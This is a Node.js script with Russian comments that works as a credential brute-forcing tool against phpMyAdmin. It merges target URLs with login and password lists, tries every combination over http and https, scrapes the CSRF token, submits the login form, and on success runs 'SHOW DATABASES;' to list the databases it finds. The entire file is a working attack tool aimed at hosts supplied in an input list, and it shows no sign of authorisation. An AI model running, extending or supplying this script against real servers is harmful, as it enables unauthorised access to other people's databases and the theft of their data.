const fs = require('fs');
const axios = require("axios");
const cheerio = require("cheerio");
const loggedAxiosRequest = require("./services/loggedAxiosRequest");
require('dotenv').config();

const phpMyAdminUrl = process.env.PHP_MY_ADMIN_URL;
let cookieHeader = "";

// === Функция для чтения файла ===
function readFileIfExists(filename) {
    if (fs.existsSync(filename)) {
        const content = fs.readFileSync(filename, 'utf-8').split('\n').map(line => line.trim()).filter(line => line);
        return new Set(content); // Убираем дубликаты, преобразуя в Set
    }
    return new Set();
}

// === Читаем входные данные ===
const mainFile = process.env.MAIN_FILE || "./files/input.txt"; // Основной файл
const loginsFile = "./files/logins.txt";
const passwordsFile = "./files/passwords.txt";

// Читаем основной файл и разбираем URL, логины и пароли
const rawLines = readFileIfExists(mainFile);
const logins = readFileIfExists(loginsFile);
const passwords = readFileIfExists(passwordsFile);

let targets = [];

for (const line of rawLines) {
    const [url, login, password] = line.split(":");
    if (url && login && password) {
        targets.push({ url, login, password });
        logins.add(login); // Добавляем в список логинов
        passwords.add(password); // Добавляем в список паролей
    }
}

// === Генерация всех комбинаций ===
const loginList = [...logins];
const passwordList = [...passwords];
const protocols = ["http", "https"];

let combinations = [ {url: 'http://localhost/phpmyadmin/',
    login: 'root',
    password: ''
}];

targets.forEach(({ url }) => {
    protocols.forEach(protocol => {
        loginList.forEach(login => {
            passwordList.forEach(password => {
                combinations.push({ url: `${protocol}://${url}`, login, password });
            });
        });
    });
});

console.log(`✅ Сформировано ${combinations.length} комбинаций для тестирования.`);

// === Функция для авторизации ===
const loginAndGetCookies = async (phpMyAdminUrl, login, password) => {
    try {
        // Запрос к странице входа
        const response = await loggedAxiosRequest.get(phpMyAdminUrl, {
            headers: { "User-Agent": "Mozilla/5.0" },
        });

        // Получаем куки из ответа
        const rawCookies = response.headers["set-cookie"];
        if (rawCookies) {
            cookieHeader = rawCookies.filter(cookie => cookie.startsWith("phpMyAdmin=")).pop().split(';')[0];
        }

        // Извлекаем токен из HTML
        const $ = cheerio.load(response.data);
        const token = $('input[name="token"]').val();
        if (!token) throw new Error("Не удалось извлечь токен.");

        console.log(`Токен получен: ${token}`);

        // Отправляем POST-запрос на авторизацию
        const loginResponse = await loggedAxiosRequest.post(phpMyAdminUrl, new URLSearchParams({
            route: "/",
            token: token,
            set_session: cookieHeader.replace("phpMyAdmin=", ""),
            pma_username: login,
            pma_password: password,
            server: "1",
        }).toString(), {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
                Cookie: cookieHeader,
            },
        });

        // Обновляем куки
        const newCookies = loginResponse.headers["set-cookie"];
        if (newCookies) {
            cookieHeader = newCookies.filter(cookie => cookie.startsWith("phpMyAdmin=")).pop().split(';')[0];
        }


        console.log(`✅ Авторизация успешна (${login}:${password}).`);
        return token;
    } catch (error) {
        console.log(`❌ Ошибка авторизации (${login}:${password}) → ${error.message}`);
        return null;
    }
};

// === Функция для выполнения SQL-запросов ===
async function executeSQLQuery(phpMyAdminUrl, token, query) {
    const queryUrl = `${phpMyAdminUrl}${process.env.ROUTE_QUERY || "/index.php?route=/import"}`;

    try {
        const response = await loggedAxiosRequest.post(queryUrl, new URLSearchParams({
            route: "/import",
            token,
            sql_query: query,
            is_js_confirmed: "1",
            ajax_request: "true",
            _nocache: Date.now(),
        }).toString(), {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
                Cookie: cookieHeader,
            },
        });

        // Обрабатываем HTML-ответ
        const $ = cheerio.load(response.data.message);
        const databases = $('table.table_results tbody tr').map((_, row) => {
            return $(row).find('td').first().text().trim();
        }).get();
        console.log(`Найденные базы данных(${databases.length}) : ${databases.join(", ")}`);
    } catch (error) {
        console.log("❌ Ошибка выполнения SQL-запроса:", error.message);
    }
}

// === Основной цикл перебора всех комбинаций ===
(async () => {
    for (const { url, login, password } of combinations) {
        console.log(`Проверяем: ${url} с логином ${login}...`);
        const token = await loginAndGetCookies(url, login, password);

        if (token) {
            console.log(`Запускаем SQL-запрос...`);
            await executeSQLQuery(url, token, "SHOW DATABASES;");
        }
    }

    console.log("✅ Тестирование завершено!");
})();
